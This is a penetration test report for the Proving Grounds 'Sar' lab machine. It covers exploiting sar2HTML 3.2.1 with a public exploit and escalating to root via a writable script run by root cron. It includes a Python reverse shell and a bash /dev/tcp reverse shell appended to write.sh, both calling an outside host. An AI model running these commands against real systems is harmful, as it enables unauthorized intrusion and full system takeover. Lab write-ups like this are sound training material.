# Penetration Test Report for Proving Grounds - Sar
- **Author:** Joey Melo
- **Date:** March 19, 2022
- **Client:** Proving Grounds
- **Host:** 192.168.214.35

## Disclaimer
The following report is the solution of a challenge in a learning platform that has no association whatsoever with the author. Please consider this report as a rough simulation of what a real pentesting report looks like. Attempting to use the methodologies demonstrated in this report in unauthorized networks is ILLEGAL. The author is not responsible for improper use or unauthorized modifications of this information. The author assumes no liability for the use of information disclosed in this report. Any damage or loss that may result from improper use of the information contained in this report is the sole responsibility of the user and not the author. The author recommends safe practices and an ethical standpoint when working with clients and or with tools demonstrated in this report.

## Introduction
This penetration test report contains all efforts that were conducted in order to assess the security of Proving Grounds. This report contains all items that were used to penetrate and gain privileged access to the remote host(s). The purpose of this report is to showcase that the tester has a full understanding of penetration testing methodologies as well as the technical knowledge to perform professional cybersecurity assessments.

## Objectives
The objective of this assessment is to perform an internal penetration test against the Sar network. The tester is tasked with following a methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how one would start from beginning to end, including the overall report.

## Executive Summary
The tester was tasked with performing an internal penetration test towards the Sar network. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks similar to those of a hacker and attempt to infiltrate Proving Grounds's internal lab systems. The tester's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Proving Grounds.
When performing the internal penetration test, there were several alarming vulnerabilities that were identified on the Sar network. When performing the attacks, the tester was able to gain access to the machine, primarily due to a vulnerable sar2HTML application running in the HTTP server. The host has been successfully exploited, and privileged access was gained in the machine.

## Recommendations
The tester recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and, once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Assessment
## Service Enumeration
### Port Scan Results
**TCP:** 22,80
## Initial Access
### Vulnerability Explanation
The HTTP server is running a deprecated version of sar2HTML, which is vulnerable to remote code execution.
### Vulnerability Fix
Update the application to its latest version or apply the vendor's patch.
### Attack Walkthrough
The tester verified an outstanding folder listed in the */robots.txt* endpoint in the HTTP server, revealing the */sar2HTML* endpoint.

![robots.txt entry](https://imgur.com/S9HiLBg.png)

![sar2HMTL front page](https://imgur.com/rpvFEDt.png)

The application's self-reported version is 3.2.1, which is vulnerable to remote code execution. The tester utilized a publicly available exploit to obtain initial access to the system.
```bash
searchsploit sar2HTML
searchsploit -m 49344
mv 49344.py sar2html-exploit.py
python3 sar2html-exploit.py
```

![Command execution through exploit](https://imgur.com/LfrvtDR.png)

![Reverse shell obtained](https://imgur.com/rdITgqZ.png)

As proof of exploitation, the tester captured the *local.txt* flag.

![User flag](https://imgur.com/d8hjxb1.png)

## Privilege Escalation
### Vulnerability Explanation
The internal system has a scheduled task that is run with root privileges. This task executes a script in which the local users have write privileges. A low-privileged user may modify the task to add malicious code and obtain high-privileged access to the machine.
### Vulnerability Fix
Remove global write permissions from the */var/www/html/write.sh* script.
### Attack Walkthrough
After establishing a foothold on the target, the tester noticed a task that executed a script named *finally.sh* with high privileges. Part of this script executed another script named *write.sh* in which the user had write access. The tester was able to append malicious code to the *write.sh* file to obtain a high-privileged shell in the system. 
```bash
echo 'bash -i >& /dev/tcp/192.168.49.214/9999 0>&1' >> /var/www/html/write.sh
```

![privileged script being executed by root with write access](https://imgur.com/Cu6BdM2.png) 

## Post-Exploitation
As proof of post-exploitation, the tester captured the *proof.txt* flag.

![Root flag](https://imgur.com/XpfleOl.png)

# Appendix A: Commands Issued
```bash
# Enumeration
sudo nmap -sC -sV -oN tcp_ports.nmap -p- 192.168.214.35 
gobuster dir -u http://192.168.214.35 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html,txt -o directories.txt

# Exploit Search
searchsploit sar2HTML
searchsploit -m 49344
mv 49344.py sar2html-exploit.py
python3 sar2html-exploit.py

# Reverse Shell
kali> nc -lvnp 1337
exploit> export RHOST="192.168.49.214";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

# Initial Access
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl +z
stty raw -echo; fg
cd /home
cat local.txt

# Privilege Escalation
cat /etc/crontab
cat /var/www/html/finally.sh
ls -la /var/www/html/finally.sh
ls -la /var/www/html/write.sh
kali> nc -lvnp 9999 # on local machine
echo 'bash -i >& /dev/tcp/192.168.49.214/9999 0>&1' >> /var/www/html/write.sh # wait 5 minutes
```
